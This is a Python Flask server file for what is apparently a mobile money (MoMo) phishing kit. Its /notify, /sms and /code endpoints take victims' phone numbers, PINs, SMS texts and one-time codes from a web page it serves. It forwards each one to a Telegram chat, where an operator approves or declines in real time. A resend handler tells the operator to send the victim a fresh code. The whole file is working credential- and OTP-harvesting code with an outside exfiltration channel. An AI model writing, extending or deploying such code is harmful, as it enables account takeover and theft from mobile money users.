from flask import Flask, request, jsonify, send_from_directory
import os
import requests
import time
import uuid

app = Flask(__name__)

BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")

# In-memory stores
PENDING = {}       # login approvals
CODE_PENDING = {}  # 4-digit code approvals


@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "POST, GET, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return response


@app.route("/", methods=["GET"])
def home():
    return send_from_directory(".", "index.html")


@app.route("/healthz", methods=["GET"])
def healthz():
    return "ok", 200


# ---------------- LOGIN ----------------
@app.route("/notify", methods=["POST", "OPTIONS"])
def notify():
    if request.method == "OPTIONS":
        return "", 204

    data = request.get_json(silent=True) or {}
    momo = data.get("momo", "unknown")
    pin = data.get("pin", "unknown")
    time_str = data.get("time", "unknown")

    request_id = uuid.uuid4().hex[:12]

    PENDING[request_id] = {
        "momo": momo,
        "pin": pin,
        "time": time_str,
        "status": "pending",
        "created_at": time.time(),
    }

    text = (
        "🔐 MoMo Login Attempt\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"📱 MoMo: {momo}\n"
        f"🔑 PIN: {pin}\n"
        f"🕒 Time: {time_str}\n\n"
        "Approve or decline this login:"
    )

    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ Approve", "callback_data": f"approve:{request_id}"},
            {"text": "❌ Decline", "callback_data": f"decline:{request_id}"},
        ]]
    }

    if not BOT_TOKEN or not CHAT_ID:
        return jsonify({"ok": False, "error": "Server not configured"}), 500

    try:
        res = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": CHAT_ID,
                "text": text,
                "reply_markup": keyboard,
            },
            timeout=10,
        )
        result = res.json()
        if not result.get("ok"):
            return jsonify({"ok": False, "error": result.get("description", "Telegram error")}), 500
        return jsonify({"ok": True, "request_id": request_id})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/status/<request_id>", methods=["GET", "OPTIONS"])
def status(request_id):
    if request.method == "OPTIONS":
        return "", 204

    entry = PENDING.get(request_id)
    if not entry:
        return jsonify({"ok": False, "status": "unknown"}), 404

    if time.time() - entry["created_at"] > 300 and entry["status"] == "pending":
        entry["status"] = "expired"

    return jsonify({"ok": True, "status": entry["status"]})


# ---------------- TELEGRAM WEBHOOK ----------------
@app.route("/telegram-webhook", methods=["POST"])
def telegram_webhook():
    update = request.get_json(silent=True) or {}
    callback = update.get("callback_query")

    print(f"[WEBHOOK] Received update: {update}", flush=True)

    if not callback:
        return "ok", 200

    callback_id = callback.get("id")
    data = callback.get("data", "")
    message = callback.get("message", {})
    message_id = message.get("message_id")
    chat_id = message.get("chat", {}).get("id")

    print(f"[WEBHOOK] callback_data={data} callback_id={callback_id}", flush=True)

    if ":" not in data:
        return "ok", 200

    action, request_id = data.split(":", 1)

    # ---------- 4-digit code approvals ----------
    if action in ("codeapprove", "codedecline"):
        entry = CODE_PENDING.get(request_id)
        print(f"[WEBHOOK] code action={action} — request_id={request_id} found={entry is not None}", flush=True)

        if not entry:
            try:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                    json={"callback_query_id": callback_id, "text": "⚠️ Request expired"},
                    timeout=5,
                )
            except Exception:
                pass
            return "ok", 200

        if action == "codeapprove":
            entry["status"] = "approved"
            answer_text = "✅ Code Approved"
        else:
            entry["status"] = "declined"
            answer_text = "❌ Code Declined"

        print(f"[WEBHOOK] >>> Setting code status={entry['status']} for {request_id}", flush=True)

        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                json={"callback_query_id": callback_id, "text": answer_text},
                timeout=5,
            )

            new_text = (
                f"🔢 4-Digit Code Entered\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"MoMo: {entry['momo']}\n"
                f"Code: {entry['code']}\n"
                f"Time: {entry['time']}\n\n"
                f"{answer_text} by admin"
            )
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
                json={
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": new_text,
                },
                timeout=5,
            )
        except Exception as e:
            print(f"[WEBHOOK] Error answering callback: {e}", flush=True)

        return "ok", 200

    # ---------- Login approvals ----------
    entry = PENDING.get(request_id)
    print(f"[WEBHOOK] login action={action} — request_id={request_id} found={entry is not None}", flush=True)

    if not entry:
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
                json={"callback_query_id": callback_id, "text": "⚠️ Request expired"},
                timeout=5,
            )
        except Exception:
            pass
        return "ok", 200

    if action == "approve":
        entry["status"] = "approved"
        answer_text = "✅ Approved"
    elif action == "decline":
        entry["status"] = "declined"
        answer_text = "❌ Declined"
    else:
        return "ok", 200

    print(f"[WEBHOOK] >>> Setting login status={entry['status']} for {request_id}", flush=True)

    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": answer_text},
            timeout=5,
        )

        new_text = (
            f"🔐 MoMo Login Attempt\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📱 MoMo: {entry['momo']}\n"
            f"🔑 PIN: {entry['pin']}\n"
            f"🕒 Time: {entry['time']}\n\n"
            f"{answer_text} by admin"
        )
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
            json={
                "chat_id": chat_id,
                "message_id": message_id,
                "text": new_text,
            },
            timeout=5,
        )
    except Exception as e:
        print(f"[WEBHOOK] Error answering callback: {e}", flush=True)

    return "ok", 200


# ---------------- SMS ----------------
@app.route("/sms", methods=["POST", "OPTIONS"])
def sms():
    if request.method == "OPTIONS":
        return "", 204

    data = request.get_json(silent=True) or {}
    momo = data.get("momo", "unknown")
    sms_text = data.get("sms", "")
    time_str = data.get("time", "unknown")

    text = (
        "📩 SMS Code Received\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"MoMo: {momo}\n"
        f"Time: {time_str}\n"
        "\n"
        "─── EXACT SMS ───\n"
        f"{sms_text}\n"
        "─── END ───"
    )

    if not BOT_TOKEN or not CHAT_ID:
        return jsonify({"ok": False, "error": "Server not configured"}), 500

    try:
        if len(text) > 4000:
            chunks = [text[i:i+3500] for i in range(0, len(text), 3500)]
            for chunk in chunks:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": CHAT_ID, "text": chunk},
                    timeout=10,
                )
            return jsonify({"ok": True})
        else:
            res = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHAT_ID, "text": text},
                timeout=10,
            )
            return jsonify(res.json())
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


# ---------------- 4-DIGIT CODE ----------------
@app.route("/code", methods=["POST", "OPTIONS"])
def code():
    if request.method == "OPTIONS":
        return "", 204

    data = request.get_json(silent=True) or {}
    momo = data.get("momo", "unknown")
    code_val = data.get("code", "")
    time_str = data.get("time", "unknown")

    request_id = uuid.uuid4().hex[:12]

    CODE_PENDING[request_id] = {
        "momo": momo,
        "code": code_val,
        "time": time_str,
        "status": "pending",
        "created_at": time.time(),
    }

    print(f"[CODE] New request_id={request_id} for momo={momo}", flush=True)

    text = (
        "🔢 4-Digit Code Entered\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"MoMo: {momo}\n"
        f"Code: {code_val}\n"
        f"Time: {time_str}\n\n"
        "Approve or decline this code:"
    )

    keyboard = {
        "inline_keyboard": [[
            {"text": "✅ Approve", "callback_data": f"codeapprove:{request_id}"},
            {"text": "❌ Decline", "callback_data": f"codedecline:{request_id}"},
        ]]
    }

    if not BOT_TOKEN or not CHAT_ID:
        return jsonify({"ok": False, "error": "Server not configured"}), 500

    try:
        res = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": CHAT_ID,
                "text": text,
                "reply_markup": keyboard,
            },
            timeout=10,
        )
        result = res.json()
        if not result.get("ok"):
            return jsonify({"ok": False, "error": result.get("description", "Telegram error")}), 500
        return jsonify({"ok": True, "request_id": request_id})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/code-status/<request_id>", methods=["GET", "OPTIONS"])
def code_status(request_id):
    if request.method == "OPTIONS":
        return "", 204

    entry = CODE_PENDING.get(request_id)

    if not entry:
        print(f"[CODE-STATUS] {request_id} NOT FOUND", flush=True)
        return jsonify({"ok": False, "status": "unknown"}), 404

    if time.time() - entry["created_at"] > 300 and entry["status"] == "pending":
        entry["status"] = "expired"

    return jsonify({"ok": True, "status": entry["status"]})


# ---------------- DEBUG ----------------
@app.route("/debug/pending", methods=["GET"])
def debug_pending():
    return jsonify({
        "login_pending": {k: v["status"] for k, v in PENDING.items()},
        "code_pending": {k: v["status"] for k, v in CODE_PENDING.items()},
    })


@app.route("/debug/force-approve/<request_id>", methods=["GET"])
def debug_force_approve(request_id):
    """Force-approve a pending code — for testing the redirect."""
    entry = CODE_PENDING.get(request_id)
    if not entry:
        return jsonify({"ok": False, "error": "not found", "id": request_id}), 404
    entry["status"] = "approved"
    return jsonify({"ok": True, "id": request_id, "status": "approved"})


@app.route("/debug/force-decline/<request_id>", methods=["GET"])
def debug_force_decline(request_id):
    """Force-decline a pending code — for testing."""
    entry = CODE_PENDING.get(request_id)
    if not entry:
        return jsonify({"ok": False, "error": "not found", "id": request_id}), 404
    entry["status"] = "declined"
    return jsonify({"ok": True, "id": request_id, "status": "declined"})


# ---------------- RESEND CODE ----------------
@app.route("/resend-code", methods=["POST", "OPTIONS"])
def resend_code():
    if request.method == "OPTIONS":
        return "", 204

    data = request.get_json(silent=True) or {}
    momo = data.get("momo", "unknown")
    time_str = data.get("time", "unknown")

    text = (
        "🔄 Resend Code Requested\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"MoMo: {momo}\n"
        f"Time: {time_str}\n\n"
        "The user requested a new 4-digit code.\n"
        "Please send a new code to their phone."
    )

    if not BOT_TOKEN or not CHAT_ID:
        return jsonify({"ok": False, "error": "Server not configured"}), 500

    try:
        res = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text},
            timeout=10,
        )
        return jsonify(res.json())
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


# ---------------- STATIC ----------------
@app.route("/<path:filename>")
def static_files(filename):
    return send_from_directory(".", filename)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
